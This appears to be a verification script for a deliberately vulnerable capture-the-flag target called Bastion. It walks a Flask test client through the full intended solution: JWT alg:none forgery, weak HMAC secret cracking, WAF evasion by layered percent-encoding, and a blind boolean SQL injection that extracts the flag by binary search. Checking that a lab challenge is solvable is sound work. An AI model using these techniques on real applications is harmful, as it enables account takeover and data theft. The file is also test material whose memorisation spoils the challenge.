"""Self-check for Bastion: proves the FULL kill chain is solvable end-to-end, in-process
(Flask test client — no docker, no network). For WAF depths 0 and 2:
  1. unauth GET /api/search -> 401.
  2. /api/session gives a role=user token that STILL can't reach search (401).
  3. escalate to admin two ways — alg:none forge AND weak-secret crack + re-sign — both reach search.
  4. with the admin token, WAF-evade at this instance's encode depth and blind-extract the
     first chars of FLAG, proving the blind oracle works behind the auth gate.
Run: ./.venv/bin/python targets/verify_bastion.py
"""
import json

import bastion_app as mod
from bastion_app import FLAG, WEAK_SECRETS, _b64e, _b64d, _sign_hs256


def _enc1(s: str) -> str:                       # percent-encode EVERY char, one layer
    return "".join("%%%02x" % ord(c) for c in s)


def _encn(s: str, n: int) -> str:
    for _ in range(n):
        s = _enc1(s)
    return s


def _forge_none(role: str = "admin") -> str:    # alg:none — empty signature, no crypto
    return (_b64e(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":"))) + "." +
            _b64e(json.dumps({"user": "guest", "role": role}, separators=(",", ":"))) + ".")


def _crack_secret(token: str) -> str:           # find which weak secret signs the given HS256 token
    a, b, sig = token.split(".")
    for sec in WEAK_SECRETS:
        if _sign_hs256(f"{a}.{b}", sec) == sig:
            return sec
    raise AssertionError("no weak secret cracked the session token")


def _forge_weak(secret: str, role: str = "admin") -> str:
    return mod._make_hs256({"user": "guest", "role": role}, secret)


def _bearer(client, token, path):
    return client.get(path, headers={"Authorization": f"Bearer {token}"})


def _present(resp) -> bool:
    return bool(resp.get_json().get("products"))


def check(depth: int):
    mod.WAF_DEPTH, mod.PARAM = depth, "q"
    mod.RATE_MAX, mod.JITTER_MS = 10_000, 0     # disable throttle/jitter for a deterministic check
    c = mod.app.test_client()

    # 1. unauthenticated -> 401
    assert c.get("/api/search?q=1").status_code == 401, "unauth should be 401"

    # 2. low-priv token from /api/session: role=user, still blocked
    low = c.get("/api/session").get_json()["token"]
    assert json.loads(_b64d(low.split(".")[1]))["role"] == "user", "session token should be role=user"
    assert _bearer(c, low, "/api/search?q=1").status_code == 401, "role=user must not reach search"

    # 3. escalate two ways -> both reach search (role=admin)
    admin_none = _forge_none()
    secret = _crack_secret(low)
    assert secret in WEAK_SECRETS
    admin_weak = _forge_weak(secret)
    for tok, how in ((admin_none, "alg:none"), (admin_weak, f"weak-secret {secret!r}")):
        r = _bearer(c, tok, "/api/search?q=1")
        assert r.status_code == 200 and _present(r), f"admin via {how} should reach search + match id 1"

    # 4. behind the gate: WAF-evade at depth d+1 and blind-extract the first chars of FLAG
    tok = admin_none

    def present(qval: str) -> bool:
        return _present(_bearer(c, tok, f"/api/search?q=" + qval))

    def bit(pos: int, v: int) -> str:            # encoded-every-char payload, evades WAF at depth
        p = f"0||ascii(substr((select flag from secrets),{pos},1))>{v}"
        return _encn(p, depth + 1)

    def bsearch(pos: int) -> int:
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if present(bit(pos, mid)):
                lo = mid + 1
            else:
                hi = mid
        return lo

    # sanity: the SAME payload encoded only d times is caught by the WAF (403)
    shallow = _bearer(c, tok, "/api/search?q=" + _encn(f"0||ascii(substr((select flag from secrets),1,1))>60", depth))
    assert shallow.status_code == 403, f"d={depth}: depth-{depth} encode should be WAF-blocked"

    extracted = "".join(chr(bsearch(i)) for i in range(1, 7))
    assert extracted == FLAG[:6], f"d={depth}: extracted {extracted!r} != {FLAG[:6]!r}"
    print(f"  ok  depth {depth}: unauth 401 -> alg:none & weak-secret escalate -> "
          f"depth-{depth+1} WAF-evade -> blind-extracted {extracted!r}")


if __name__ == "__main__":
    for d in (0, 2):
        check(d)
    print(f"\nbastion verified: full JWT->WAF'd-blind-SQLi chain solvable (flag starts {FLAG[:6]!r})")
